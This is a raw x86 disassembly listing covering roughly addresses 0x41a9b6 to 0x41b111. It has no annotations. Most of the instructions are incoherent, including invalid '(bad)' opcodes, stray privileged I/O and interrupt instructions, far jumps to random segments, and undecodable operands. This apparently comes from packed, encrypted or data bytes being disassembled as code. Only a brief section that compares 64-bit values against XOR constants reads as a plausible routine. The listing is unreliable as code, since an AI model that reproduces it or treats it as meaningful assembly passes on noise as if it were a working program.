  41a9b6:	ss jmp 0xd289:0x63a9f2d7
  41a9be:	lods   eax,DWORD PTR ds:[esi]
  41a9bf:	xchg   edx,eax
  41a9c0:	push   es
  41a9c1:	push   es
  41a9c2:	inc    ebx
  41a9c3:	mov    ch,0xb9
  41a9c5:	int    0x68
  41a9c7:	dec    ecx
  41a9c8:	sahf   
  41a9c9:	mov    edx,0x6b536a2e
  41a9ce:	push   ds
  41a9cf:	mov    eax,0x7669139e
  41a9d4:	sbb    dh,ah
  41a9d6:	push   esi
  41a9d7:	lds    ebp,FWORD PTR ds:0xd809c0dd
  41a9dd:	hlt    
  41a9de:	(bad)  
  41a9e0:	cmp    dh,dh
  41a9e2:	mov    cl,BYTE PTR [ebp+0x43f4bbd0]
  41a9e8:	fwait
  41a9e9:	pop    ebp
  41a9ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9eb:	mov    ds:0x41e44dd4,al
  41a9f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a9f1:	pop    ss
  41a9f2:	hlt    
  41a9f3:	cmp    esi,esp
  41a9f5:	outs   dx,BYTE PTR ds:[esi]
  41a9f6:	mov    ch,0xb
  41a9f8:	repnz enter 0xae5a,0x6b
  41a9fd:	dec    edx
  41a9fe:	add    ebp,edx
  41aa00:	push   esp
  41aa01:	(bad)  
  41aa02:	mul    DWORD PTR [ecx+esi*8-0x6cfd37c6]
  41aa09:	rcl    DWORD PTR [edi-0x7a],0x76
  41aa0d:	pop    ebx
  41aa0e:	test   eax,0xdbb65e8b
  41aa13:	mov    bl,0xc0
  41aa15:	ja     0x41a9dd
  41aa17:	pop    ebp
  41aa18:	mov    bl,BYTE PTR [esi+0x178ba943]
  41aa1e:	leave  
  41aa1f:	cmp    eax,0xe144207a
  41aa24:	sub    al,0x53
  41aa26:	repnz and eax,0x7248139d
  41aa2c:	sub    BYTE PTR [esi+0x51],0x9d
  41aa30:	dec    edi
  41aa31:	pop    edi
  41aa32:	dec    ebx
  41aa33:	aas    
  41aa34:	push   0x17
  41aa36:	dec    edx
  41aa37:	mov    DWORD PTR [ecx],ebx
  41aa39:	in     eax,0xbe
  41aa3b:	add    dh,0xc
  41aa3e:	sar    BYTE PTR [eax-0x7b30ed68],0xeb
  41aa45:	out    dx,al
  41aa46:	push   cs
  41aa47:	iret   
  41aa48:	pop    edx
  41aa49:	test   eax,0x3edfe585
  41aa4e:	out    0x28,eax
  41aa50:	outs   dx,BYTE PTR ds:[esi]
  41aa51:	push   ebp
  41aa52:	cld    
  41aa53:	and    bl,BYTE PTR cs:[ecx+0xf]
  41aa57:	cmp    DWORD PTR [ecx+edi*4-0x10],ecx
  41aa5b:	jecxz  0x41aa0c
  41aa5d:	xchg   DWORD PTR [eax-0x101f6b05],esi
  41aa63:	out    0x71,eax
  41aa65:	xchg   DWORD PTR [esi+0x2d],edx
  41aa68:	or     DWORD PTR [eax-0x905bcf9],esp
  41aa6e:	push   cs
  41aa6f:	bnd jne 0x41aa03
  41aa72:	push   ebp
  41aa73:	push   edi
  41aa74:	loopne 0x41aa51
  41aa76:	popa   
  41aa77:	mov    edi,0xfc0b0030
  41aa7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa7d:	mov    ah,0x22
  41aa7f:	jno    0x41aa07
  41aa81:	das    
  41aa82:	dec    ecx
  41aa83:	mov    al,ds:0x46d01b54
  41aa88:	jne    0x41aa37
  41aa8a:	call   0xa0c1ac0a
  41aa8f:	pusha  
  41aa90:	jmp    0xf0ced072
  41aa95:	mov    ebx,0xd3adc3c7
  41aa9a:	jb     0x41aa87
  41aa9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa9d:	(bad)  
  41aa9e:	xor    al,0x25
  41aaa0:	push   edi
  41aaa1:	sub    al,0x6d
  41aaa3:	push   0x8
  41aaa5:	into   
  41aaa6:	fistp  WORD PTR [eax-0x7]
  41aaa9:	sbb    al,0x90
  41aaab:	sbb    eax,0xaa77ca12
  41aab0:	jns    0x41aa7a
  41aab2:	jp     0x41aaf2
  41aab4:	pop    es
  41aab5:	push   ebx
  41aab6:	fwait
  41aab7:	pop    eax
  41aab8:	cmp    esp,DWORD PTR ds:0xee74102d
  41aabe:	dec    ebx
  41aabf:	popa   
  41aac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aac1:	inc    esp
  41aac2:	push   cs
  41aac3:	xchg   edx,eax
  41aac4:	xchg   BYTE PTR [edx-0x3c],ah
  41aac7:	mov    ch,0x81
  41aac9:	push   esi
  41aaca:	pop    es
  41aacb:	or     DWORD PTR [ecx-0x78],0x3062968c
  41aad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad3:	push   ds
  41aad4:	jo     0x41ab0b
  41aad6:	push   0xfffffff4
  41aad8:	mov    esi,0x2fbed80
  41aadd:	imul   esi,DWORD PTR [eax],0x16502d72
  41aae3:	xor    eax,0xc6573519
  41aae8:	push   cs
  41aae9:	sbb    eax,0x11b1b87
  41aaee:	div    esi
  41aaf0:	rol    BYTE PTR [ebx-0x5bca571e],0x27
  41aaf7:	not    BYTE PTR [ecx]
  41aaf9:	lds    ebx,FWORD PTR ds:0xab8dcaae
  41aaff:	jnp    0x41aaee
  41ab01:	mov    ds,WORD PTR [edx+eiz*2+0x5c8b9442]
  41ab08:	and    al,0x34
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x42206a
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x42206a
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax+0x7cb90ee9],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1+0x57e1818],bh
  41ab67:	mov    eax,fs
  41ab69:	xchg   ebp,eax
  41ab6a:	jo     0x41ab8b
  41ab6c:	or     cl,BYTE PTR [ebp+0x72e9b19a]
  41ab72:	sbb    cl,BYTE PTR [ebx]
  41ab74:	outs   dx,BYTE PTR ds:[esi]
  41ab75:	inc    ecx
  41ab76:	push   ecx
  41ab77:	xlat   BYTE PTR ds:[ebx]
  41ab78:	mov    bl,0xd6
  41ab7a:	fwait
  41ab7b:	cmp    al,0x8a
  41ab7d:	js     0x41abfd
  41ab7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab80:	fcom   DWORD PTR [ecx+0xf]
  41ab83:	and    DWORD PTR [edi+0x5455263c],esi
  41ab89:	repz ret 
  41ab8b:	fdivr  QWORD PTR [esi-0x14]
  41ab8e:	clc    
  41ab8f:	sub    esp,DWORD PTR [edi+0x31]
  41ab92:	loope  0x41ab36
  41ab94:	ret    
  41ab95:	test   DWORD PTR [edx+0x1e],edx
  41ab98:	(bad)  
  41ab99:	nop
  41ab9a:	stc    
  41ab9b:	and    al,0x4f
  41ab9d:	or     DWORD PTR [edx],0x18c56977
  41aba3:	stos   DWORD PTR es:[edi],eax
  41aba4:	xchg   ecx,eax
  41aba5:	cmp    al,0x2d
  41aba7:	jb     0x41ab79
  41aba9:	mov    bh,0x84
  41abab:	in     al,dx
  41abac:	pop    esp
  41abad:	xor    al,0x11
  41abaf:	int3   
  41abb0:	or     ecx,DWORD PTR [edi]
  41abb2:	push   ss
  41abb3:	xor    ebp,DWORD PTR [edx+0x56e12a54]
  41abb9:	popa   
  41abba:	in     eax,dx
  41abbb:	loop   0x41ab4f
  41abbd:	and    DWORD PTR [ebp+0x478b206e],ecx
  41abc3:	or     eax,0xded2a3d4
  41abc8:	pop    edx
  41abc9:	pop    ds
  41abca:	in     eax,0xb6
  41abcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abcd:	jae    0x41ab86
  41abcf:	pop    edi
  41abd0:	cmc    
  41abd1:	mov    BYTE PTR [edx],cl
  41abd3:	dec    edx
  41abd4:	popf   
  41abd5:	int3   
  41abd6:	sbb    esp,DWORD PTR [edi-0x6aa0bc66]
  41abdc:	ret    0xf1dd
  41abdf:	xchg   edx,eax
  41abe0:	cld    
  41abe1:	jno    0x41ab70
  41abe3:	mov    ds:0xa0495e58,al
  41abe8:	mov    fs:0x89e1f865,al
  41abee:	repnz out dx,al
  41abf0:	ss sbb eax,0xdc4a180c
  41abf6:	dec    eax
  41abf7:	dec    esi
  41abf8:	loopne 0x41aba0
  41abfa:	add    cl,ch
  41abfc:	aam    0x5f
  41abfe:	int    0xe9
  41ac00:	jo     0x41ac10
  41ac02:	dec    edx
  41ac03:	pop    esp
  41ac04:	jp     0x41ac5c
  41ac06:	outs   dx,BYTE PTR ds:[esi]
  41ac07:	pushf  
  41ac08:	fistp  DWORD PTR [ebp-0xe]
  41ac0b:	sbb    DWORD PTR [esi],edi
  41ac0d:	not    BYTE PTR [edi]
  41ac0f:	pop    ebp
  41ac10:	popa   
  41ac11:	ja     0x41abdf
  41ac13:	test   eax,0xc378ff79
  41ac18:	(bad)  
  41ac19:	les    ebx,FWORD PTR [esi+0x631e651b]
  41ac1f:	dec    ebx
  41ac20:	adc    esp,ecx
  41ac22:	sbb    eax,0xab426423
  41ac27:	pop    ss
  41ac28:	ss call 0xd1da666f
  41ac2e:	pushf  
  41ac2f:	pop    ecx
  41ac30:	add    dh,BYTE PTR [eax]
  41ac32:	mov    ah,0x85
  41ac34:	fs dec eax
  41ac36:	sar    BYTE PTR [ebx],0x91
  41ac39:	rol    DWORD PTR [esp+ebp*8-0x38],0xfe
  41ac3e:	(bad)  
  41ac3f:	daa    
  41ac40:	mov    eax,ds:0xfb00e3fb
  41ac45:	(bad)  
  41ac46:	cmc    
  41ac47:	and    al,0x71
  41ac49:	or     BYTE PTR [edx],ah
  41ac4b:	mov    ds:0xea70d131,eax
  41ac50:	js     0x41ac2a
  41ac52:	loope  0x41abd6
  41ac54:	fisubr DWORD PTR [edi]
  41ac56:	mov    bh,0x6f
  41ac58:	inc    edi
  41ac59:	pop    esi
  41ac5a:	sbb    eax,0xd8f285dd
  41ac5f:	push   ebx
  41ac60:	loop   0x41accc
  41ac62:	pop    edx
  41ac63:	mov    esp,0x5062a04e
  41ac68:	(bad)  
  41ac69:	ja     0x41ac4e
  41ac6b:	das    
  41ac6c:	adc    al,0x47
  41ac6e:	or     dh,BYTE PTR [eax]
  41ac70:	dec    esp
  41ac71:	ret    0xd0c6
  41ac74:	xchg   DWORD PTR [edx-0x77],eax
  41ac77:	xchg   ecx,eax
  41ac78:	loope  0x41ac8c
  41ac7a:	jmp    0xb284:0x7ab06c59
  41ac81:	add    eax,0xc8826f32
  41ac86:	or     al,0xa0
  41ac88:	dec    esp
  41ac89:	pop    ecx
  41ac8a:	add    edi,ecx
  41ac8c:	mov    edi,0xdb0973b7
  41ac91:	lods   al,BYTE PTR ds:[esi]
  41ac92:	add    esp,DWORD PTR [ecx-0x74]
  41ac95:	clc    
  41ac96:	pushf  
  41ac97:	loope  0x41ac8f
  41ac99:	push   ds
  41ac9a:	retf   
  41ac9b:	jo     0x41ac66
  41ac9d:	mov    al,0x5c
  41ac9f:	lods   eax,DWORD PTR ds:[esi]
  41aca0:	inc    ecx
  41aca1:	(bad)  
  41aca2:	cmp    al,0xda
  41aca4:	lds    edx,FWORD PTR [esi]
  41aca6:	int3   
  41aca7:	jp     0x41acfe
  41aca9:	pop    ebp
  41acaa:	pop    ss
  41acab:	xchg   edi,eax
  41acac:	pushf  
  41acad:	test   eax,0xc0bd7759
  41acb2:	cmp    esp,DWORD PTR [edi-0x71e43869]
  41acb8:	cmp    eax,0x1a71daa3
  41acbd:	sahf   
  41acbe:	jmp    0x8450:0xd87a77a8
  41acc5:	js     0x41acbf
  41acc7:	cmp    edx,DWORD PTR [esi+0x20]
  41acca:	js     0x41ad07
  41accc:	stos   DWORD PTR es:[edi],eax
  41accd:	imul   eax,DWORD PTR [eax-0x5b],0x1c524c79
  41acd4:	bound  ebx,QWORD PTR [ebx+0x17]
  41acd7:	test   al,0x30
  41acd9:	adc    BYTE PTR [ecx-0x6228f0d1],ch
  41acdf:	inc    ecx
  41ace0:	and    DWORD PTR [ebx],ebx
  41ace2:	fcomp  QWORD PTR [edx+0x3926e344]
  41ace8:	lods   eax,DWORD PTR ds:[esi]
  41ace9:	cmp    eax,0xcccaedeb
  41acee:	test   al,0xc1
  41acf0:	dec    edx
  41acf1:	mov    ?,WORD PTR [ebx]
  41acf3:	push   edi
  41acf4:	mov    DWORD PTR [ebx],edi
  41acf6:	push   es
  41acf7:	jl     0x41acd8
  41acf9:	call   0xbc9beade
  41acfe:	rol    DWORD PTR [edx],1
  41ad00:	cdq    
  41ad01:	test   al,0x16
  41ad03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad04:	jge    0x41acfb
  41ad06:	mov    ch,BYTE PTR [ebx]
  41ad08:	fldenv [eax+ebx*8]
  41ad0b:	adc    eax,0xdc9b2df8
  41ad10:	xor    eax,0x2f1ac820
  41ad15:	sbb    BYTE PTR [eax],ah
  41ad17:	pop    ecx
  41ad18:	pop    ebx
  41ad19:	mov    WORD PTR [ebx],fs
  41ad1b:	jno    0x41ad2c
  41ad1d:	outs   dx,BYTE PTR ds:[esi]
  41ad1e:	pop    esi
  41ad1f:	in     eax,dx
  41ad20:	pop    esp
  41ad21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad22:	pop    ebp
  41ad23:	(bad)  
  41ad24:	lock fs add al,bh
  41ad28:	add    edi,esp
  41ad2a:	enter  0xfbc0,0x9e
  41ad2e:	xchg   esp,eax
  41ad2f:	ins    DWORD PTR es:[edi],dx
  41ad30:	pop    ss
  41ad31:	outs   dx,BYTE PTR ds:[esi]
  41ad32:	xchg   esp,eax
  41ad33:	or     dl,BYTE PTR [ebp+0x33]
  41ad36:	dec    ecx
  41ad37:	mov    BYTE PTR [esi-0x6c],al
  41ad3a:	dec    ebx
  41ad3b:	mov    bh,0xde
  41ad3d:	fistp  DWORD PTR [eax-0x3487da6]
  41ad43:	nop
  41ad44:	repnz push ebx
  41ad46:	push   0xadce5879
  41ad4b:	xor    eax,0x917f1fc7
  41ad50:	sub    BYTE PTR [edx-0x2c74fba7],0xb4
  41ad57:	adc    edx,DWORD PTR [esi+ebp*2+0x5a]
  41ad5b:	enter  0xa163,0xb2
  41ad5f:	add    eax,0x5c1caeab
  41ad64:	nop
  41ad65:	xchg   esp,eax
  41ad66:	adc    ebx,esp
  41ad68:	out    0x97,eax
  41ad6a:	sbb    al,0x2c
  41ad6c:	popa   
  41ad6d:	dec    esi
  41ad6e:	lods   al,BYTE PTR ds:[esi]
  41ad6f:	outs   dx,BYTE PTR ds:[esi]
  41ad70:	div    BYTE PTR cs:[ebx]
  41ad73:	push   eax
  41ad74:	ins    DWORD PTR es:[edi],dx
  41ad75:	pushf  
  41ad76:	call   0xb86eb5af
  41ad7b:	push   cs
  41ad7c:	mov    edx,0x9786ea7c
  41ad81:	cdq    
  41ad82:	cwde   
  41ad83:	out    dx,al
  41ad84:	sub    BYTE PTR [esi-0x77],bh
  41ad87:	arpl   WORD PTR [eax+0x15b8223a],dx
  41ad8d:	fcmove st,st(6)
  41ad8f:	push   ss
  41ad90:	and    bl,dl
  41ad92:	xchg   esi,eax
  41ad93:	inc    esi
  41ad94:	xchg   ecx,eax
  41ad95:	ins    DWORD PTR es:[edi],dx
  41ad96:	adc    ch,dh
  41ad98:	imul   ebp,DWORD PTR [ecx+ebp*4],0xd49e1705
  41ad9f:	fadd   DWORD PTR [ecx-0x65238b6f]
  41ada5:	outs   dx,DWORD PTR ds:[esi]
  41ada6:	dec    DWORD PTR [ecx-0x1113587d]
  41adac:	xlat   BYTE PTR ds:[ebx]
  41adad:	fadd   QWORD PTR [ebp+0x46]
  41adb0:	fldcw  WORD PTR [esi]
  41adb2:	pop    eax
  41adb3:	push   ebx
  41adb4:	(bad)  
  41adb5:	or     DWORD PTR [esp+edx*8+0x7c07695b],ebx
  41adbc:	sub    eax,0xb9a63bd4
  41adc1:	push   esp
  41adc2:	lock pushf 
  41adc4:	lods   al,BYTE PTR ds:[esi]
  41adc5:	cmp    DWORD PTR [edi],ebx
  41adc7:	sbb    eax,0x4937d591
  41adcc:	sbb    eax,eax
  41adce:	xor    eax,0x354e9103
  41add3:	push   0x9d5bd708
  41add8:	ins    BYTE PTR es:[edi],dx
  41add9:	inc    edi
  41adda:	icebp  
  41addb:	jb     0x41add3
  41addd:	je     0x41ad64
  41addf:	std    
  41ade0:	fiadd  WORD PTR [esi]
  41ade2:	call   DWORD PTR [bx+si]
  41ade5:	cwde   
  41ade6:	scas   al,BYTE PTR es:[edi]
  41ade7:	arpl   WORD PTR [ebx+0x7461ec5d],bp
  41aded:	dec    esp
  41adee:	aam    0xa7
  41adf0:	xchg   esp,eax
  41adf1:	leave  
  41adf2:	aaa    
  41adf3:	imul   ebp,ecx,0x63
  41adf6:	std    
  41adf7:	mov    dh,0x9
  41adf9:	dec    edi
  41adfa:	mov    ecx,esi
  41adfc:	mov    cs,esp
  41adfe:	in     al,dx
  41adff:	enter  0x3b53,0xb7
  41ae03:	int    0x86
  41ae05:	ins    BYTE PTR es:[edi],dx
  41ae06:	xchg   edx,eax
  41ae07:	add    DWORD PTR [eax-0x26],0xb2475544
  41ae0e:	and    DWORD PTR [edx+0x4dcaf4ab],edi
  41ae14:	cmp    eax,0x32
  41ae17:	outs   dx,BYTE PTR ds:[esi]
  41ae18:	test   al,0x4d
  41ae1a:	in     al,dx
  41ae1b:	lahf   
  41ae1c:	add    ebp,DWORD PTR [esi-0x569ca2d8]
  41ae22:	lea    eax,[eax-0x6b]
  41ae25:	sti    
  41ae26:	push   0x38
  41ae28:	jg     0x41ae14
  41ae2a:	jle    0x41ae56
  41ae2c:	pusha  
  41ae2d:	inc    esp
  41ae2e:	xchg   ecx,eax
  41ae2f:	xor    ebx,ebx
  41ae31:	dec    edx
  41ae32:	xor    edx,edx
  41ae34:	cwde   
  41ae35:	sbb    DWORD PTR ss:[ecx],edx
  41ae38:	adc    dl,bh
  41ae3a:	sub    al,0xc2
  41ae3c:	jbe    0x41adf0
  41ae3e:	jns    0x41ae5f
  41ae40:	inc    ebp
  41ae41:	cmc    
  41ae42:	and    DWORD PTR [ebx+0x6f],ecx
  41ae45:	inc    edx
  41ae46:	pop    ss
  41ae47:	mov    edx,0x59098844
  41ae4c:	cwde   
  41ae4d:	dec    esi
  41ae4e:	sbb    esi,esi
  41ae50:	ss daa 
  41ae52:	in     eax,0x5e
  41ae54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae55:	inc    ebx
  41ae56:	sar    ecx,cl
  41ae58:	imul   eax,DWORD PTR [edi],0x46eeca25
  41ae5e:	jle    0x41ae21
  41ae60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae61:	sti    
  41ae62:	push   ecx
  41ae63:	push   eax
  41ae64:	inc    esp
  41ae65:	(bad)  
  41ae66:	pop    ecx
  41ae67:	retf   0x22c1
  41ae6a:	and    BYTE PTR [edi-0x46],al
  41ae6d:	cs outs dx,DWORD PTR ss:[esi]
  41ae70:	shl    BYTE PTR [ebp+0x48],cl
  41ae73:	cdq    
  41ae74:	std    
  41ae75:	sub    eax,0x189c931e
  41ae7a:	or     ch,BYTE PTR [esi-0x10]
  41ae7d:	(bad)  
  41ae7e:	mov    ecx,0x20b21f9a
  41ae83:	icebp  
  41ae84:	lds    edi,FWORD PTR [ebx-0x4142ae49]
  41ae8a:	jmp    0xca3b:0xeb178905
  41ae91:	int    0x96
  41ae93:	pop    ebx
  41ae94:	xor    al,al
  41ae96:	aad    0x16
  41ae98:	aas    
  41ae99:	mov    esp,0xfcffd861
  41ae9e:	ret    0xc89d
  41aea1:	pop    ebp
  41aea2:	cmp    BYTE PTR [ecx+0x5abb1d32],dl
  41aea8:	inc    ecx
  41aea9:	aam    0xe6
  41aeab:	adc    bh,BYTE PTR ds:0xf1beba96
  41aeb1:	mov    BYTE PTR [ebx+esi*4+0x72492a50],bh
  41aeb8:	push   edi
  41aeb9:	adc    DWORD PTR [eax-0x9],eax
  41aebc:	lock jp 0x41ae4a
  41aebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec0:	pop    esi
  41aec1:	(bad)  
  41aec2:	ins    BYTE PTR es:[edi],dx
  41aec3:	aas    
  41aec4:	or     eax,0xff0e0883
  41aec9:	xchg   esp,eax
  41aeca:	prefetchnta BYTE PTR [eax+edx*8+0x39fbd126]
  41aed2:	jno    0x41af2e
  41aed4:	sbb    al,0xac
  41aed6:	xor    al,0xc3
  41aed8:	call   0x531f0a9c
  41aedd:	sub    DWORD PTR [eax+0x20],ebx
  41aee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee1:	inc    esp
  41aee2:	xchg   esi,eax
  41aee3:	ror    eax,1
  41aee5:	mov    dl,BYTE PTR [ebx-0x29]
  41aee8:	popf   
  41aee9:	sbb    al,0x6
  41aeeb:	data16 mov ah,0xe6
  41aeee:	push   0xb1622571
  41aef3:	mov    esp,0xf74371cd
  41aef8:	dec    ebp
  41aef9:	sub    DWORD PTR [ebx+0x2f501731],0x65018e7
  41af03:	add    bl,BYTE PTR [edi]
  41af05:	jae    0x41ae98
  41af07:	push   esi
  41af08:	mov    dh,0x2b
  41af0a:	icebp  
  41af0b:	aam    0x9a
  41af0d:	cs loop 0x41af30
  41af10:	rcr    DWORD PTR [ebx+0x2b],0x96
  41af14:	nop
  41af15:	jmp    0x41aee2
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af6f
  41af80:	sub    ebp,ecx
  41af82:	stos   BYTE PTR es:[edi],al
  41af83:	pop    ss
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1-0x66d7e7e8],bh
  41af8d:	dec    ebx
  41af8e:	sub    esi,edi
  41af90:	dec    eax
  41af91:	jmp    0xfcd5:0xf8eeffba
  41af98:	mov    ecx,0x79983c54
  41af9d:	es test al,0x30
  41afa0:	cld    
  41afa1:	add    bh,BYTE PTR [ebx+0x78]
  41afa4:	inc    edi
  41afa5:	cmc    
  41afa6:	in     eax,0xbe
  41afa8:	ret    0x6b9e
  41afab:	fs aad 0xef
  41afae:	mov    fs,WORD PTR [eax+0x1edaf70f]
  41afb4:	cmp    al,BYTE PTR [ebx+0x5ac3c118]
  41afba:	out    dx,eax
  41afbb:	push   ebx
  41afbc:	fsubrp st(4),st
  41afbe:	pop    ecx
  41afbf:	fisub  WORD PTR [eax]
  41afc1:	ror    ecx,1
  41afc3:	sub    DWORD PTR [ecx],esp
  41afc5:	pop    ebp
  41afc6:	out    0x39,eax
  41afc8:	fldenv [ecx-0x1c98673a]
  41afce:	xor    ah,BYTE PTR [esi-0x5b]
  41afd1:	mov    esp,0x6f225ac
  41afd6:	stos   DWORD PTR es:[edi],eax
  41afd7:	lock sbb BYTE PTR [edi-0x9f3fef8],dl
  41afde:	retf   
  41afdf:	mov    bh,0x75
  41afe1:	sti    
  41afe2:	call   eax
  41afe4:	sbb    dh,BYTE PTR [edx+ebx*4]
  41afe7:	xchg   edi,eax
  41afe8:	mov    ebx,0x8ee36db5
  41afed:	sbb    ecx,DWORD PTR [ecx+ecx*8]
  41aff0:	jg     0x41afcd
  41aff2:	pop    ds
  41aff3:	or     esi,DWORD PTR [ebp+0x6f6a1f45]
  41aff9:	inc    BYTE PTR [ecx-0x7f]
  41affc:	add    BYTE PTR [ebx],ah
  41affe:	stos   BYTE PTR es:[edi],al
  41afff:	fstp   QWORD PTR [edi]
  41b001:	dec    edi
  41b002:	push   ss
  41b003:	inc    ebp
  41b004:	sub    esi,DWORD PTR [ebx]
  41b006:	dec    esp
  41b007:	(bad)  
  41b008:	retf   
  41b009:	iret   
  41b00a:	fnstenv [ebx+0x24]
  41b00d:	int    0xf1
  41b00f:	pop    eax
  41b010:	das    
  41b011:	clc    
  41b012:	mov    eax,0xdd9df6df
  41b017:	push   esi
  41b018:	dec    edi
  41b019:	hlt    
  41b01a:	pop    esp
  41b01b:	imul   ebx,DWORD PTR [edi],0xc353227e
  41b021:	cmc    
  41b022:	mov    bl,0xc4
  41b024:	ret    
  41b025:	push   esp
  41b026:	dec    esp
  41b027:	push   ss
  41b028:	and    BYTE PTR [ebx],0x3
  41b02b:	mov    dh,0x5
  41b02d:	sahf   
  41b02e:	ret    0x396d
  41b031:	aas    
  41b032:	cwde   
  41b033:	lock mov ds:0x8591a308,eax
  41b039:	mov    esi,0xeca9f965
  41b03e:	cwde   
  41b03f:	adc    DWORD PTR [ebx-0x6f69714b],esi
  41b045:	push   ss
  41b046:	das    
  41b047:	add    al,0x76
  41b049:	(bad)  
  41b04a:	daa    
  41b04b:	add    al,0xc5
  41b04d:	int3   
  41b04e:	cdq    
  41b04f:	fnstcw WORD PTR [edx-0x74]
  41b052:	pop    ds
  41b053:	jno    0x41afdd
  41b055:	imul   eax,DWORD PTR [ebp-0x401647ad],0xad1542b0
  41b05f:	rcr    DWORD PTR [ebx],1
  41b061:	jp     0x41b0d2
  41b063:	rcl    DWORD PTR [esi+0x62070229],1
  41b069:	shr    BYTE PTR [ebp-0x4c],cl
  41b06c:	jno    0x41b0e3
  41b06e:	dec    edi
  41b06f:	icebp  
  41b070:	xchg   esi,eax
  41b071:	ins    BYTE PTR es:[edi],dx
  41b072:	seta   BYTE PTR [ebx-0x2ecef5d0]
  41b079:	jae    0x41b02c
  41b07b:	xchg   edi,eax
  41b07c:	push   ebp
  41b07d:	imul   DWORD PTR [esi-0x2f9ee9b5]
  41b083:	fidivr WORD PTR [ebx-0x722d28b7]
  41b089:	pop    ebp
  41b08a:	mov    cl,0xe9
  41b08c:	mov    eax,esi
  41b08e:	mov    ?,WORD PTR [ebp-0x61928fb6]
  41b094:	lea    edi,[edx]
  41b096:	pop    esp
  41b097:	sub    DWORD PTR [ebx],ecx
  41b099:	xlat   BYTE PTR ds:[ebx]
  41b09a:	stc    
  41b09b:	in     al,0x54
  41b09d:	rol    ch,cl
  41b09f:	or     eax,0xae421aa6
  41b0a4:	shl    BYTE PTR [esi-0xd57e02e],0xa5
  41b0ab:	push   edi
  41b0ac:	or     edx,DWORD PTR [ecx+0x167eebeb]
  41b0b2:	int3   
  41b0b3:	and    bh,ch
  41b0b5:	jnp    0x41b122
  41b0b7:	mov    ebx,0xabb793e8
  41b0bc:	push   edi
  41b0bd:	xlat   BYTE PTR ds:[ebx]
  41b0be:	mov    al,ds:0x712e6cb8
  41b0c3:	adc    DWORD PTR [esi+eiz*2],edi
  41b0c6:	repz in eax,0x2
  41b0c9:	mov    ds,ebp
  41b0cb:	dec    ecx
  41b0cc:	and    eax,0xd113a4a6
  41b0d1:	(bad)  
  41b0d2:	fwait
  41b0d3:	in     eax,0xb3
  41b0d5:	mov    ecx,0x2c5608e4
  41b0da:	mov    DWORD PTR [esi-0x79],0x534bfe54
  41b0e1:	adc    al,0xb
  41b0e3:	fldcw  WORD PTR [edi+0x698bf995]
  41b0e9:	popf   
  41b0ea:	lock es jbe 0x41b151
  41b0ee:	imul   ecx,edx,0x184df6eb
  41b0f4:	mov    bh,0xf4
  41b0f6:	jno    0x41b08c
  41b0f8:	mov    fs,esp
  41b0fa:	sti    
  41b0fb:	or     eax,0x6c45df01
  41b100:	mov    DWORD PTR [eax],eax
  41b102:	test   BYTE PTR [edx-0x78],al
  41b105:	lds    ebp,FWORD PTR [edi+eax*4-0x3584ed6]
  41b10c:	test   DWORD PTR [ecx],edx
  41b10e:	mov    cs,ecx
  41b110:	push   ds
  41b111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
